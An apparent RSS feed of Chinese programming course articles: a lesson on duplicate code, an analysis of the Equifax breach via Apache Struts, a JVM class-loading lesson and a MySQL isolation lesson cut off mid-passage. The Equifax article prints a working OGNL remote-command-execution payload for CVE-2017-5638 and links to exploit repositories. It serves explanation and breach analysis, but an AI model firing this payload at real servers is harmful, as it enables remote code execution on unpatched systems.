&lt;p>这一讲我们讲到重复代码，讲到了几个典型的坏味道：&lt;/p>
&lt;ul>
&lt;li>复制粘贴的代码；&lt;/li>
&lt;li>结构重复的代码；&lt;/li>
&lt;li>if 和 else 代码块中的语句高度类似。&lt;/li>
&lt;/ul>
&lt;p>很多重复代码的产生通常都是从程序员偷懒开始的，而这些程序员的借口都是为了快，却为后续工作埋下更多地隐患，真正的&amp;quot;欲速而不达&amp;quot;。&lt;/p>
&lt;p>复制粘贴的代码和结构重复的代码，虽然从观感上有所差异，但本质上都是重复，只不过，一个是名词的微调，一个是动词的微调。&lt;/p>
&lt;p>程序员千万不要复制粘贴，&lt;strong>如果需要复制粘贴，首先应该做的是提取一个新的函数出来，把公共的部分先统一掉。&lt;/strong>&lt;/p>
&lt;p>if 和 else 的代码块中的语句高度类似，通常是程序员不经意造成的，但这也是对于写代码没有高标准要求的结果。让 if 语句做真正的选择，是提高代码表达准确性的重要一步。&lt;/p>
&lt;p>作为一个精进中的程序员，我们一定要把 DRY 原则记在心中，时时刻刻保持对&amp;quot;重复&amp;quot;的敏感度，把各种重复降到最低。&lt;/p>
&lt;p>如果今天的内容你只能记住一件事，那请记住：&lt;strong>不要重复自己，不要复制粘贴&lt;/strong>。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/b1/d0/b191yy7a7dc54572cb7fce85d80f5fd0.jpg" alt="">&lt;/p>
&lt;h1 id="思考题">思考题&lt;/h1>
&lt;p>这一讲的主题是重复代码，你在实际工作中都遇到过什么样的重复代码，你是怎样处理它们的呢？欢迎在留言区分享你的经验。&lt;/p>
&lt;p>参考资料：&lt;/p>
&lt;p>分离关注点：软件设计至关重要的第一步&lt;/p>
&lt;p>简单设计：难道一开始就要把设计做复杂吗？&lt;/p></description></item><item><title>极客专栏: 03丨Equifax信息泄露始末</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E5%B7%A6%E8%80%B3%E5%90%AC%E9%A3%8E/03%E4%B8%A8equifax%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%A7%8B%E6%9C%AB/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E5%B7%A6%E8%80%B3%E5%90%AC%E9%A3%8E/03%E4%B8%A8equifax%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%A7%8B%E6%9C%AB/</guid><description>
&lt;p>相信你一定有所耳闻，9 月份美国知名征信公司 Equifax 出现了大规模数据泄露事件，致使 1.43 亿美国用户及大量的英国和加拿大用户受到影响。今天，我就来跟你聊聊 Equifax 信息泄露始末，并对造成本次事件的原因进行简单的分析。&lt;/p>
&lt;h1 id="equifax-信息泄露始末">Equifax 信息泄露始末&lt;/h1>
&lt;p>Equifax 日前确认，黑客利用了其系统中未修复的 Apache Struts 漏洞（CVE-2017-5638，2017 年 3 月 6 日曝光）来发起攻击，导致了最近这次影响恶劣的大规模数据泄露事件。&lt;/p>
&lt;p>作为美国三大信用报告公司中历史最悠久的一家，Equifax 的主营业务是为客户提供美国、加拿大和其他多个国家的公民信用信息。保险公司就是其服务的主要客户之一，涉及生命、汽车、火灾、医疗保险等多个方面。&lt;/p>
&lt;p>此外，Equifax 还提供入职背景调查、保险理赔调查，以及针对企业的信用调查等服务。由于 Equifax 掌握了多个国家公民的信用档案，包括公民的学前、学校经历、婚姻、工作、健康、政治参与等大量隐私信息，所以这次的信息泄露，影响面积很大，而且性质特别恶劣。&lt;/p>
&lt;p>受这次信息泄露影响的美国消费者有 1.43 亿左右，另估计约有 4400 万的英国客户和大量加拿大客户受到影响。事件导致 Equifax 市值瞬间蒸发掉逾 30 亿美元。&lt;/p>
&lt;p>根据《华尔街日报》（The Wall Street Journal）的观察，自 Equifax 在 9 月 8 日披露黑客进入该公司部分系统以来，全美联邦法院接到的诉讼已经超过百起。针对此次事件，Equifax 首席执行官理查德·史密斯（Richard Smith）表示，公司正在对整体安全操作进行全面彻底的审查。&lt;/p>
&lt;p>事件发生之初，Equifax 在声明中指出，黑客是利用了某个&amp;quot;U.S. website application&amp;quot;中的漏洞获取文件。后经调查，黑客是利用了 Apache Struts 的 CVE-2017-5638 漏洞。&lt;/p>
&lt;p>戏剧性的是，该漏洞于今年 3 月份就已被披露，其危险系数定为最高分 10 分，Apache 随后发布的 Struts 2.3.32 和 2.5.10.1 版本特针对此漏洞进行了修复。而 Equifax 在漏洞公布后的两个月内都没有升级 Struts 版本，导致 5 月份黑客利用这个漏洞进行攻击，泄露其敏感数据。&lt;/p>
&lt;p>事实上，除了 Apache 的漏洞，黑客还使用了一些其他手段绕过 WAF（Web 应用程序防火墙）。有些管理面板居然位于 Shodan 搜索引擎上。更让人大跌眼镜的是，据研究人员分析，Equifax 所谓的&amp;quot;管理面板&amp;quot;都没有采取任何安保措施。安全专家布莱恩·克雷布斯（Brian Krebs）在其博客中爆料，Equifax 的一个管理面板使用的用户名和密码都是&amp;quot;admin&amp;quot;。&lt;/p>
&lt;p>由于管理面板能被随意访问，获取数据库密码就轻而易举了&amp;mdash;&amp;mdash;虽然管理面板会加密数据库密码之类的东西，但是密钥却和管理面板保存在了一起。虽然是如此重要的征信机构，但 Equifax 的安全意识之弱可见一斑。&lt;/p>
&lt;p>据悉，Equifax 某阿根廷员工门户也泄露了 14000 条记录，包括员工凭证和消费者投诉。本次事件发生后，好事者列举了 Equifax 系统中的一系列漏洞，包括一年以前向公司报告的未修补的跨站脚本（XSS）漏洞，更将 Equifax 推向了风口浪尖。&lt;/p>
&lt;h1 id="apache-struts-漏洞相关">Apache Struts 漏洞相关&lt;/h1>
&lt;p>Apache Struts 是世界上最流行的 Java Web 服务器框架之一，它最初是 Jakarta 项目中的一个子项目，并在 2004 年 3 月成为 Apache 基金会的顶级项目。&lt;/p>
&lt;p>Struts 通过采用 Java Servlet/JSP 技术，实现了基于 Java EE Web 应用的 MVC 设计模式的应用框架，也是当时第一个采用 MVC 模式的 Web 项目开发框架。随着技术的发展和认知的提升，Struts 的设计者意识到 Struts 的一些缺陷，于是有了重新设计的想法。&lt;/p>
&lt;p>2006 年，另外一个 MVC 框架 WebWork 的设计者与 Struts 团队一起开发了新一代的 Struts 框架，它整合了 WebWork 与 Struts 的优点，同时命名为&amp;quot;Struts 2&amp;quot;，原来的 Struts 框架改名为 Struts 1。&lt;/p>
&lt;p>因为两个框架都有强大的用户基础，所以 Struts 2 一发布就迅速流行开来。在 2013 年 4 月，Apache Struts 项目团队发布正式通知，宣告 Struts 1.x 开发框架结束其使命，并表示接下来官方将不会继续提供支持。自此 Apache Struts 1 框架正式退出历史舞台。&lt;/p>
&lt;p>同期，Struts 社区表示他们将专注于推动 Struts 2 框架的发展。从这几年的版本发布情况来看，Struts 2 的迭代速度确实不慢，仅仅在 2017 年就发布了 9 个版本，平均一个月一个。&lt;/p>
&lt;p>但从安全角度来看，Struts 2 可谓是漏洞百出，因为框架的功能基本已经健全，所以这些年 Struts 2 的更新和迭代基本也是围绕漏洞和 Bug 进行修复。仅从官方披露的安全公告中就可以看到，这些年就有 53 个漏洞预警，包括大家熟知的远程代码执行高危漏洞。&lt;/p>
&lt;p>根据网络上一份未被确认的数据显示，中国的 Struts 应用分布在全球范围内排名第一，第二是美国，然后是日本，而中国没有打补丁的 Struts 的数量几乎是其它国家的总和。特别是在浙江、北京、广东、山东、四川等地，涉及教育、金融、互联网、通信等行业。&lt;/p>
&lt;p>所以在今年 7 月，国家信息安全漏洞共享平台还发布过关于做好 Apache Struts 2 高危漏洞管理和应急工作的安全公告，大致意思是希望企业能够加强学习，提高安全认识，同时完善相关流程，协同自律。&lt;/p>
&lt;p>而这次 Equifax 中招的漏洞编号是 CVE-2017-5638，官方披露的信息见下图。简单来说，这是一个 RCE 的远程代码执行漏洞，最初是被安恒信息的 Nike Zheng 发现的，并于 3 月 7 日上报。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/00/cc/009ecfbac5741ea7ffd7fa3079a8c8cc.png" alt="">&lt;/p>
&lt;p>从介绍中可以看出，此次漏洞的原因是 Apache Struts 2 的 Jakarta Multipart parser 插件存在远程代码执行漏洞，攻击者可以在使用该插件上传文件时，修改 HTTP 请求头中的 Content-Type 值来触发漏洞，最后远程执行代码。&lt;/p>
&lt;p>说白了，就是在 Content-Type 注入 OGNL 语言，进而执行命令。代码如下（一行 Python 命令就可以执行服务器上的 shell 命令）：&lt;/p>
&lt;pre>&lt;code>import requests
requests.get(&amp;quot;https://target&amp;quot;, headers={&amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;, &amp;quot;Accept&amp;quot;: &amp;quot;*/*&amp;quot;, &amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla/5.0&amp;quot;, &amp;quot;Content-Type&amp;quot;: &amp;quot;%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&amp;quot;})
&lt;/code>&lt;/pre>
&lt;p>在 GitHub 上有相关的代码，链接为：&lt;a href="https://github.com/mazen160/struts-pwn">https://github.com/mazen160/struts-pwn&lt;/a> 或 &lt;a href="https://github.com/xsscx/cve-2017-5638">https://github.com/xsscx/cve-2017-5638&lt;/a>&lt;/p>
&lt;p>注入点是在 JakartaMultiPartRequest.java 的 buildErrorMessage 函数中，这个函数里的 localizedTextUtil.findText 会执行 OGNL 表达式，从而导致命令执行（注：可以参看 Struts 两个版本的补丁&amp;quot;2.5.10.1 版补丁&amp;quot;&amp;ldquo;2.3.32 版补丁&amp;rdquo;），使客户受到影响。&lt;/p>
&lt;p>因为默认情况下 Jakarta 是启用的，所以该漏洞的影响范围甚广。当时官方给出的解决方案是尽快升级到不受影响的版本，看来 Equifax 的同学并没有注意到，或者也没有认识到它的严重性。&lt;/p>
&lt;p>另外，在 9 月 5 日和 7 日，Struts 官方又接连发布了几个严重级别的安全漏洞公告，分别是 CVE-2017-9804、CVE-2017-9805、CVE-2017-9793 和 CVE-2017-12611。&lt;/p>
&lt;p>这里面最容易被利用的当属 CVE-2017-9805，它是由国外安全研究组织 lgtm.com 的安全研究人员发现的又一个远程代码执行漏洞。漏洞原因是 Struts 2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，所以在反序列化 XML payloads 时就可能导致远程代码执行。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/f8/02/f8a10b42faf789018e0a5dfadbbd0c02.png" alt="">&lt;/p>
&lt;p>不过在 Apache 软件基金会的项目管理委员会的回应文章中，官方也对事故原因进行了分析和讨论。首先，依然不能确定泄露的源头是 Struts 的漏洞导致的。其次，如果确实是源于 Struts 的漏洞，那么原因&amp;quot;或是 Equifax 服务器未打补丁，使得一些更早期公布的漏洞被攻击者利用，或者是攻击者利用了一个目前尚未被发现的漏洞&amp;quot;。&lt;/p>
&lt;p>根据推测，该声明提出黑客所使用的软件漏洞可能就是 CVE-2017-9805 漏洞，该漏洞虽然是在 9 月 4 日才由官方正式公布，但早在 7 月时就有人公布在网络上了，并且这个漏洞的存在已有 9 年。&lt;/p>
&lt;p>相信通过今天的分享，你一定对 Equifax 的数据泄露始末及造成原因有了清楚的了解。欢迎您把你的收获和想法，分享给我。下篇文章中，我们将回顾一下互联网时代的! 其他大规模数据泄露事件，并结合这些事件给出应对方案和技术手段。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/fc/e9/fcc761001867c60f526665e237f831e9.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 03丨Java虚拟机是如何加载Java类的？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E6%8B%86%E8%A7%A3jvm%E8%99%9A%E6%8B%9F%E6%9C%BA/03%E4%B8%A8java%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%AF%E5%A6%82%E4%BD%95%E5%8A%A0%E8%BD%BDjava%E7%B1%BB%E7%9A%84/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E6%8B%86%E8%A7%A3jvm%E8%99%9A%E6%8B%9F%E6%9C%BA/03%E4%B8%A8java%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%AF%E5%A6%82%E4%BD%95%E5%8A%A0%E8%BD%BDjava%E7%B1%BB%E7%9A%84/</guid><description>
&lt;p>听我的意大利同事说，他们那边有个习俗，就是父亲要帮儿子盖栋房子。&lt;/p>
&lt;p>这事要放在以前还挺简单，亲朋好友搭把手，盖个小砖房就可以住人了。现在呢，整个过程要耗费好久的时间。首先你要请建筑师出个方案，然后去市政部门报备、验证，通过后才可以开始盖房子。盖好房子还要装修，之后才能住人。&lt;/p>
&lt;p>盖房子这个事，和 Java 虚拟机中的类加载还是挺像的。从 class 文件到内存中的类，按先后顺序需要经过加载、链接以及初始化三大步骤。其中，链接过程中同样需要验证；而内存中的类没有经过初始化，同样不能使用。那么，是否所有的 Java 类都需要经过这几步呢？&lt;/p>
&lt;p>我们知道 Java 语言的类型可以分为两大类：基本类型（primitive types）和引用类型（reference types）。在上一篇中，我已经详细介绍过了 Java 的基本类型，它们是由 Java 虚拟机预先定义好的。&lt;/p>
&lt;p>至于另一大类引用类型，Java 将其细分为四种：类、接口、数组类和泛型参数。由于泛型参数会在编译过程中被擦除（我会在专栏的第二部分详细介绍），因此 Java 虚拟机实际上只有前三种。在类、接口和数组类中，数组类是由 Java 虚拟机直接生成的，其他两种则有对应的字节流。&lt;/p>
&lt;p>说到字节流，最常见的形式要属由 Java 编译器生成的 class 文件。除此之外，我们也可以在程序内部直接生成，或者从网络中获取（例如网页中内嵌的小程序 Java applet）字节流。这些不同形式的字节流，都会被加载到 Java 虚拟机中，成为类或接口。为了叙述方便，下面我就用&amp;quot;类&amp;quot;来统称它们。&lt;/p>
&lt;p>无论是直接生成的数组类，还是加载的类，Java 虚拟机都需要对其进行链接和初始化。接下来，我会详细给你介绍一下每个步骤具体都在干些什么。&lt;/p>
&lt;h2 id="加载">加载&lt;/h2>
&lt;p>加载，是指查找字节流，并且据此创建类的过程。前面提到，对于数组类来说，它并没有对应的字节流，而是由 Java 虚拟机直接生成的。对于其他的类来说，Java 虚拟机则需要借助类加载器来完成查找字节流的过程。&lt;/p>
&lt;p>以盖房子为例，村里的 Tony 要盖个房子，那么按照流程他得先找个建筑师，跟他说想要设计一个房型，比如说&amp;quot;一房、一厅、四卫&amp;quot;。你或许已经听出来了，这里的房型相当于类，而建筑师，就相当于类加载器。&lt;/p>
&lt;p>村里有许多建筑师，他们等级森严，但有着共同的祖师爷，叫启动类加载器（bootstrap class loader）。启动类加载器是由 C++ 实现的，没有对应的 Java 对象，因此在 Java 中只能用 null 来指代。换句话说，祖师爷不喜欢像 Tony 这样的小角色来打扰他，所以谁也没有祖师爷的联系方式。&lt;/p>
&lt;p>除了启动类加载器之外，其他的类加载器都是 java.lang.ClassLoader 的子类，因此有对应的 Java 对象。这些类加载器需要先由另一个类加载器，比如说启动类加载器，加载至 Java 虚拟机中，方能执行类加载。&lt;/p>
&lt;p>村里的建筑师有一个潜规则，就是接到单子自己不能着手干，得先给师傅过过目。师傅不接手的情况下，才能自己来。在 Java 虚拟机中，这个潜规则有个特别的名字，叫双亲委派模型。每当一个类加载器接收到加载请求时，它会先将请求转发给父类加载器。在父类加载器没有找到所请求的类的情况下，该类加载器才会尝试去加载。&lt;/p>
&lt;p>在 Java 9 之前，启动类加载器负责加载最为基础、最为重要的类，比如存放在 JRE 的 lib 目录下 jar 包中的类（以及由虚拟机参数 -Xbootclasspath 指定的类）。除了启动类加载器之外，另外两个重要的类加载器是扩展类加载器（extension class loader）和应用类加载器（application class loader），均由 Java 核心类库提供。&lt;/p>
&lt;p>扩展类加载器的父类加载器是启动类加载器。它负责加载相对次要、但又通用的类，比如存放在 JRE 的 lib/ext 目录下 jar 包中的类（以及由系统变量 java.ext.dirs 指定的类）。&lt;/p>
&lt;p>应用类加载器的父类加载器则是扩展类加载器。它负责加载应用程序路径下的类。（这里的应用程序路径，便是指虚拟机参数 -cp/-classpath、系统变量 java.class.path 或环境变量 CLASSPATH 所指定的路径。）默认情况下，应用程序中包含的类便是由应用类加载器加载的。&lt;/p>
&lt;p>Java 9 引入了模块系统，并且略微更改了上述的类加载器&lt;a href="https://docs.oracle.com/javase/9/migrate/toc.htm#JSMIG-GUID-A868D0B9-026F-4D46-B979-901834343F9E">1&lt;/a>。扩展类加载器被改名为平台类加载器（platform class loader）。Java SE 中除了少数几个关键模块，比如说 java.base 是由启动类加载器加载之外，其他的模块均由平台类加载器所加载。&lt;/p>
&lt;p>除了由 Java 核心类库提供的类加载器外，我们还可以加入自定义的类加载器，来实现特殊的加载方式。举例来说，我们可以对 class 文件进行加密，加载时再利用自定义的类加载器对其解密。&lt;/p>
&lt;p>除了加载功能之外，类加载器还提供了命名空间的作用。这个很好理解，打个比方，咱们这个村不讲究版权，如果你剽窃了另一个建筑师的设计作品，那么只要你标上自己的名字，这两个房型就是不同的。&lt;/p>
&lt;p>在 Java 虚拟机中，类的唯一性是由类加载器实例以及类的全名一同确定的。即便是同一串字节流，经由不同的类加载器加载，也会得到两个不同的类。在大型应用中，我们往往借助这一特性，来运行同一个类的不同版本。&lt;/p>
&lt;h2 id="链接">链接&lt;/h2>
&lt;p>链接，是指将创建成的类合并至 Java 虚拟机中，使之能够执行的过程。它可分为验证、准备以及解析三个阶段。&lt;/p>
&lt;p>验证阶段的目的，在于确保被加载类能够满足 Java 虚拟机的约束条件。这就好比 Tony 需要将设计好的房型提交给市政部门审核。只有当审核通过，才能继续下面的建造工作。&lt;/p>
&lt;p>通常而言，Java 编译器生成的类文件必然满足 Java 虚拟机的约束条件。因此，这部分我留到讲解字节码注入时再详细介绍。&lt;/p>
&lt;p>准备阶段的目的，则是为被加载类的静态字段分配内存。Java 代码中对静态字段的具体初始化，则会在稍后的初始化阶段中进行。过了这个阶段，咱们算是盖好了毛坯房。虽然结构已经完整，但是在没有装修之前是不能住人的。&lt;/p>
&lt;p>除了分配内存外，部分 Java 虚拟机还会在此阶段构造其他跟类层次相关的数据结构，比如说用来实现虚方法的动态绑定的方法表。&lt;/p>
&lt;p>在 class 文件被加载至 Java 虚拟机之前，这个类无法知道其他类及其方法、字段所对应的具体地址，甚至不知道自己方法、字段的地址。因此，每当需要引用这些成员时，Java 编译器会生成一个符号引用。在运行阶段，这个符号引用一般都能够无歧义地定位到具体目标上。&lt;/p>
&lt;p>举例来说，对于一个方法调用，编译器会生成一个包含目标方法所在类的名字、目标方法的名字、接收参数类型以及返回值类型的符号引用，来指代所要调用的方法。&lt;/p>
&lt;p>解析阶段的目的，正是将这些符号引用解析成为实际引用。如果符号引用指向一个未被加载的类，或者未被加载类的字段或方法，那么解析将触发这个类的加载（但未必触发这个类的链接以及初始化。）&lt;/p>
&lt;p>如果将这段话放在盖房子的语境下，那么符号引用就好比&amp;quot;Tony 的房子&amp;quot;这种说法，不管它存在不存在，我们都可以用这种说法来指代 Tony 的房子。实际引用则好比实际的通讯地址，如果我们想要与 Tony 通信，则需要启动盖房子的过程。&lt;/p>
&lt;p>Java 虚拟机规范并没有要求在链接过程中完成解析。它仅规定了：如果某些字节码使用了符号引用，那么在执行这些字节码之前，需要完成对这些符号引用的解析。&lt;/p>
&lt;h2 id="初始化">初始化&lt;/h2>
&lt;p>在 Java 代码中，如果要初始化一个静态字段，我们可以在声明时直接赋值，也可以在静态代码块中对其赋值。&lt;/p>
&lt;p>如果直接赋值的静态字段被 final 所修饰，并且它的类型是基本类型或字符串时，那么该字段便会被 Java 编译器标记成常量值（ConstantValue），其初始化直接由 Java 虚拟机完成。除此之外的直接赋值操作，以及所有静态代码块中的代码，则会被 Java 编译器置于同一方法中，并把它命名为 &amp;lt; clinit &amp;gt;。&lt;/p>
&lt;p>类加载的最后一步是初始化，便是为标记为常量值的字段赋值，以及执行 &amp;lt; clinit &amp;gt; 方法的过程。Java 虚拟机会通过加锁来确保类的 &amp;lt; clinit &amp;gt; 方法仅被执行一次。&lt;/p>
&lt;p>只有当初始化完成之后，类才正式成为可执行的状态。这放在我们盖房子的例子中就是，只有当房子装修过后，Tony 才能真正地住进去。&lt;/p>
&lt;p>那么，类的初始化何时会被触发呢？JVM 规范枚举了下述多种触发情况：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>当虚拟机启动时，初始化用户指定的主类；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当遇到用以新建目标类实例的 new 指令时，初始化 new 指令的目标类；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当遇到调用静态方法的指令时，初始化该静态方法所在的类；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当遇到访问静态字段的指令时，初始化该静态字段所在的类；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>子类的初始化会触发父类的初始化；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果一个接口定义了 default 方法，那么直接实现或者间接实现该接口的类的初始化，会触发该接口的初始化；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>使用反射 API 对某个类进行反射调用时，初始化这个类；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当初次调用 MethodHandle 实例时，初始化该 MethodHandle 指向的方法所在的类。&lt;/p>
&lt;p>public class Singleton {
private Singleton() {}
private static class LazyHolder {
static final Singleton INSTANCE = new Singleton();
}
public static Singleton getInstance() {
return LazyHolder.INSTANCE;
}
}&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>我在文章中贴了一段代码，这段代码是在著名的单例延迟初始化例子中&lt;a href="https://en.wikipedia.org/wiki/Initialization-on-demand_holder_idiom">2&lt;/a>，只有当调用 Singleton.getInstance 时，程序才会访问 LazyHolder.INSTANCE，才会触发对 LazyHolder 的初始化（对应第 4 种情况），继而新建一个 Singleton 的实例。&lt;/p>
&lt;p>由于类初始化是线程安全的，并且仅被执行一次，因此程序可以确保多线程环境下有且仅有一个 Singleton 实例。&lt;/p>
&lt;h2 id="总结与实践">总结与实践&lt;/h2>
&lt;p>今天我介绍了 Java 虚拟机将字节流转化为 Java 类的过程。这个过程可分为加载、链接以及初始化三大步骤。&lt;/p>
&lt;p>加载是指查找字节流，并且据此创建类的过程。加载需要借助类加载器，在 Java 虚拟机中，类加载器使用了双亲委派模型，即接收到加载请求时，会先将请求转发给父类加载器。&lt;/p>
&lt;p>链接，是指将创建成的类合并至 Java 虚拟机中，使之能够执行的过程。链接还分验证、准备和解析三个阶段。其中，解析阶段为非必须的。&lt;/p>
&lt;p>初始化，则是为标记为常量值的字段赋值，以及执行 &amp;lt; clinit &amp;gt; 方法的过程。类的初始化仅会被执行一次，这个特性被用来实现单例的延迟初始化。&lt;/p>
&lt;p>今天的实践环节，你可以来验证一下本篇中的理论知识。&lt;/p>
&lt;p>通过 JVM 参数 -verbose:class 来打印类加载的先后顺序，并且在 LazyHolder 的初始化方法中打印特定字样。在命令行中运行下述指令（不包含提示符 $）：&lt;/p>
&lt;pre>&lt;code>$ echo '
public class Singleton {
private Singleton() {}
private static class LazyHolder {
static final Singleton INSTANCE = new Singleton();
static {
System.out.println(&amp;quot;LazyHolder.&amp;lt;clinit&amp;gt;&amp;quot;);
}
}
public static Object getInstance(boolean flag) {
if (flag) return new LazyHolder[2];
return LazyHolder.INSTANCE;
}
public static void main(String[] args) {
getInstance(true);
System.out.println(&amp;quot;----&amp;quot;);
getInstance(false);
}
}' &amp;gt; Singleton.java
$ javac Singleton.java
$ java -verbose:class Singleton
&lt;/code>&lt;/pre>
&lt;p>问题 1：新建数组（第 11 行）会导致 LazyHolder 的加载吗？会导致它的初始化吗？&lt;/p>
&lt;p>在命令行中运行下述指令（不包含提示符 $）：&lt;/p>
&lt;pre>&lt;code>$ java -cp /path/to/asmtools.jar org.openjdk.asmtools.jdis.Main Singleton\$LazyHolder.class &amp;gt; Singleton\$LazyHolder.jasm.1
$ awk 'NR==1,/stack 1/{sub(/stack 1/, &amp;quot;stack 0&amp;quot;)} 1' Singleton\$LazyHolder.jasm.1 &amp;gt; Singleton\$LazyHolder.jasm
$ java -cp /path/to/asmtools.jar org.openjdk.asmtools.jasm.Main Singleton\$LazyHolder.jasm
$ java -verbose:class Singleton
&lt;/code>&lt;/pre>
&lt;p>问题 2：新建数组会导致 LazyHolder 的链接吗？&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/2a/d5/2a62e58cbdf56a5dc40748567d346fd5.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 03丨事务隔离：为什么你改了我还看不见？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/mysql-%E5%AE%9E%E6%88%98-45-%E8%AE%B2/03%E4%B8%A8%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E6%94%B9%E4%BA%86%E6%88%91%E8%BF%98%E7%9C%8B%E4%B8%8D%E8%A7%81/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/mysql-%E5%AE%9E%E6%88%98-45-%E8%AE%B2/03%E4%B8%A8%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E6%94%B9%E4%BA%86%E6%88%91%E8%BF%98%E7%9C%8B%E4%B8%8D%E8%A7%81/</guid><description>
&lt;p>提到事务，你肯定不陌生，和数据库打交道的时候，我们总是会用到事务。最经典的例子就是转账，你要给朋友小王转 100 块钱，而此时你的银行卡只有 100 块钱。&lt;/p>
&lt;p>转账过程具体到程序里会有一系列的操作，比如查询余额、做加减法、更新余额等，这些操作必须保证是一体的，不然等程序查完之后，还没做减法之前，你这 100 块钱，完全可以借着这个时间差再查一次，然后再给另外一个朋友转账，如果银行这么整，不就乱了么？这时就要用到&amp;quot;事务&amp;quot;这个概念了。&lt;/p>
&lt;p>简单来说，事务就是要保证一组数据库操作，要么全部成功，要么全部失败。在 MySQL 中，事务支持是在引擎层实现的。你现在知道，MySQL 是一个支持多引擎的系统，但并不是所有的引擎都支持事务。比如 MySQL 原生的 MyISAM 引擎就不支持事务，这也是 MyISAM 被 InnoDB 取代的重要原因之一。&lt;/p>
&lt;p>今天的文章里，我将会以 InnoDB 为例，剖析 MySQL 在事务支持方面的特定实现，并基于原理给出相应的实践建议，希望这些案例能加深你对 MySQL 事务原理的理解。&lt;/p>
&lt;h1 id="隔离性与隔离级别">隔离性与隔离级别&lt;/h1>
&lt;p>提到事务，你肯定会想到 ACID（Atomicity、Consistency、Isolation、Durability，即原子性、一致性、隔离性、持久性），今天我们就来说说其中 I，也就是&amp;quot;隔离性&amp;quot;。&lt;/p>
&lt;p>当数据库上有多个事务同时执行的时候，就可能出现脏读（dirty read）、不可重复读（non-repeatable read）、幻读（phantom read）的问题，为了解决这些问题，就有了&amp;quot;隔离级别&amp;quot;的概念。&lt;/p>
&lt;p>在谈隔离级别之前，你首先要知道，你隔离得越严实，效率就会越低。因此很多时候，我们都要在二者之间寻找一个平衡点。SQL 标准的事务隔离级别包括：读未提交（read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（serializable ）。下面我逐一为你解释：&lt;/p>
&lt;ul>
&lt;li>读未提交是指，一个事务还没提交时，它做的变更就能被别的事务看到。&lt;/li>
&lt;li>读提交是指，一个事务提交之后，它做的变更才会被其他事务看到。&lt;/li>
&lt;li>可重复读是指，一个事务执行过程中看到的数据，总是跟这个事务在启动时看到的数据是一致的。当然在可重复读隔离级别下，未提交变更对其他事务也是不可见的。&lt;/li>
&lt;li>串行化，顾名思义是对于同一行记录，&amp;ldquo;写&amp;quot;会加&amp;quot;写锁&amp;rdquo;，&amp;ldquo;读&amp;quot;会加&amp;quot;读锁&amp;rdquo;。当出现读写锁冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行。&lt;/li>
&lt;/ul>
&lt;p>其中&amp;quot;读提交&amp;quot;和&amp;quot;可重复读&amp;quot;比较难理解，所以我用一个例子说明这几种隔离级别。假设数据表 T 中只有一列，其中一行的值为 1，下面是按照时间顺序执行两个事务的行为。&lt;/p>
&lt;pre>&lt;code>mysql&amp;gt; create table T(c int) engine=InnoDB;
insert into T(c) values(1);
&lt;/code>&lt;/pre>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/7d/f8/7dea45932a6b722eb069d2264d0066f8.png" alt="">&lt;br>
我们来看看在不同的隔离级别下，事务 A 会有哪些不同的返回结果，也就是图里面 V1、V2、V3 的返回值分别是什么。&lt;/p>
&lt;ul>
&lt;li>若隔离级别是&amp;quot;读未提交&amp;quot;， 则 V1 的值就是 2。这时候事务 B 虽然还没有提交，但是结果已经被 A 看到了。因此，V2、V3 也都是 2。&lt;/li>
